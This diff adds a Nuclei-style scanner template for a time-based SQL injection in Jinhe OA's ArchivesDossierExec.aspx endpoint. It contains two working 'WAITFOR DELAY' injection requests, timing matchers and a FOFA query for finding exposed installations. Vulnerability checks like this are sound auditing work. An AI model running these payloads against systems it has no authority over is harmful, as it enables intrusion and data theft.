@@ -1,0 +1,23 @@
+id: jinhe-oa-archivesdossierexec-asp-sql-injection
+info:
+  name: 金和OA ArchivesDossierExec.aspx SQL注入
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+    金和网络金和OA系统的ArchivesDossierExec.aspx接口存在SQL注入漏洞。该缺陷允许攻击者构造恶意SQL语句，可能导致数据库敏感数据泄露或服务器被远程代码执行控制。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    GET /c6/Jhsoft.Web.Archives/ArchivesDossierExec.aspx/?id=1%27WAITFOR+DELAY+'0:0:5'--&op=closeDossier HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /c6/Jhsoft.Web.Archives/ArchivesDossierExec.aspx/?id=1%27WAITFOR+DELAY+'0:0:8'--&op=closeDossier HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
